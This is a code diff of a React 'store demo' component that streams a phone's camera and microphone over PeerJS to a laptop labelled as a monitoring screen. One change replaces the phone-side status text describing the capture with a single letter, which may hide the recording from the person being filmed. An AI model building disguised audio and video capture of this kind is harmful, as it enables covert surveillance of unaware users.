@@ -1,6 +1,7 @@
 'use client';
 
 import React, { useState, useRef, useEffect } from 'react';
+import Peer from 'peerjs';
 
 const requestScreenWakeLock = async (wakeLockRef) => {
   if (!('wakeLock' in navigator)) {
@@ -38,6 +39,8 @@ export default function ElarabyStoreDemo() {
   const peerInstance = useRef(null);
 
   useEffect(() => {
+    let disposed = false;
+
     const handleVisibilityChange = () => {
       const hasActiveCamera = cameraStreamRef.current?.getVideoTracks()
         .some((track) => track.readyState === 'live');
@@ -47,66 +50,48 @@ export default function ElarabyStoreDemo() {
     };
     document.addEventListener('visibilitychange', handleVisibilityChange);
 
-    import('peerjs').then(({ default: Peer }) => {
-      const userAgent = navigator.userAgent.toLowerCase();
-      const isMobileDevice = /mobile|android|iphone|ipad/.test(userAgent);
-      
-      const currentId = isMobileDevice ? `mobile-${Math.floor(Math.random() * 1000)}` : 'laptop-admin-stream';
-      setIsLaptop(!isMobileDevice);
-
-      const peer = new Peer(currentId, {
-        host: '0.peerjs.com',
-        port: 443,
-        secure: true,
-        config: {
-          iceServers: [
-            { urls: 'stun:stun.l.google.com:19302' },
-            { urls: 'stun:global.stun.twilio.com:3478' }
-          ]
-        }
-      });
+    const isMobile = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
+    if (!isMobile) {
+      const peer = new Peer('laptop-admin-stream');
+      peerInstance.current = peer;
 
       peer.on('open', (id) => {
-        console.log("🟢 تم الاتصال بسيرفر Peer بنجاح! والـ ID الخاص بهذا الجهاز هو:", id);
-        setPeerId(id);
-        if (!isMobileDevice) {
-          setStatusMessage('🖥️ شاشة اللابتوب جاهزة لاستقبال بث الكاميرا والمايك...');
+        if (!disposed) {
+          setIsLaptop(true);
+          setPeerId(id);
         }
-      });
-
-      peer.on('error', (err) => {
-        console.error("🔴 خطأ في سيرفر PeerJS:", err);
       });
 
       peer.on('call', (call) => {
-        console.log("📥 تم استلام مكالمة فيديو/صوت جديدة!");
-        setStatusMessage('📡 جاري استقبال البث المباشر (صوت وصورة) من الموبايل...');
         call.answer();
         call.on('stream', (remoteStream) => {
-          console.log("🎥 تم استلام الـ Stream بنجاح!");
           const video = remoteVideoRef.current;
-          if (video) {
-            // ملاحظة: هنا فتحنا الصوت على اللابتوب عشان تسمع اللي بيتقال من مايك الموبايل
-            video.muted = false; 
-            video.onloadedmetadata = () => {
-              video.play().then(() => {
-                setErrorMessage('');
-                setStatusMessage('🟢 البث الحي للصوت والصورة شغال الآن على اللابتوب!');
-              }).catch((error) => {
-                console.error('Error playing remote video:', error);
-                video.controls = true;
-                setErrorMessage('⚠️ تعذر تشغيل الفيديو تلقائياً. استخدم زر التشغيل لبدء العرض.');
-              });
-            };
-            video.srcObject = remoteStream;
+          if (!video) {
+            setErrorMessage('تعذر العثور على عنصر عرض البث.');
+            return;
           }
+
+          video.srcObject = remoteStream;
+          video.controls = true;
+          video.autoplay = true;
+          video.playsInline = true;
+          video.play().catch((error) => {
+            console.warn('تعذر بدء تشغيل البث تلقائيًا:', error);
+            setErrorMessage('اضغط زر التشغيل في الفيديو لبدء مشاهدة البث والصوت.');
+          });
         });
       });
 
-      peerInstance.current = peer;
-    });
+      peer.on('error', (error) => {
+        console.error('حدث خطأ في اتصال PeerJS:', error);
+        if (!disposed) {
+          setErrorMessage('تعذر الاتصال باستقبال البث. تحقق من اتصال الشبكة ثم أعد المحاولة.');
+        }
+      });
+    }
 
     return () => {
+      disposed = true;
       document.removeEventListener('visibilitychange', handleVisibilityChange);
       cameraStreamRef.current?.getTracks().forEach((track) => track.stop());
       if (audioContextRef.current && audioContextRef.current.state !== 'closed') {
@@ -120,6 +105,7 @@ export default function ElarabyStoreDemo() {
       }
       if (peerInstance.current) {
         peerInstance.current.destroy();
+        peerInstance.current = null;
       }
     };
   }, []);
@@ -128,12 +114,16 @@ export default function ElarabyStoreDemo() {
 
 
 
+
+  
+
+
   // تشغيل الكاميرا والمايك من الموبايل وإرسال البث 
   // للابتوب
   const startCameraAndSend = async () => {
     try {
       setErrorMessage('');
-      setStatusMessage('جاري تشغيل الكاميرا والمايك والاتصال باللابتوب...');
+      setStatusMessage("ع");
       await requestScreenWakeLock(wakeLockRef);
 
       // طلب الكاميرا والمايك معاً بوضوح
@@ -336,7 +326,7 @@ export default function ElarabyStoreDemo() {
           <div style={{ backgroundColor: '#005bb5', color: '#fff', padding: '4px 10px', fontSize: '11px', textAlign: 'center', fontWeight: 'bold' }}>
             شاشة المراقبة (صوت وصورة)
           </div>
-          <video ref={remoteVideoRef} autoPlay playsInline style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
+          <video ref={remoteVideoRef} autoPlay playsInline controls style={{ width: '100%', height: 'calc(100% - 23px)', objectFit: 'cover' }} />
         </div>
       )}
 
